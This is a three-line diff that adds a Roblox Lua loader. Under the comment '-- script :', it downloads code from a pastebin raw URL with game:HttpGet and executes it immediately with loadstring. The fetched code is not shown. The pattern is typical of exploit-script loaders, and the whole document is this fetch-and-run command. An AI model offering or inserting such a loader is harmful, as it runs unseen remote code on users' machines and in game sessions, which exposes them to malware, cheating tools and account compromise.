@@ -1,0 +1,3 @@
+
+-- script : 
+loadstring(game:HttpGet("https://pastebin.com/raw/ZMy9t7zX"))()
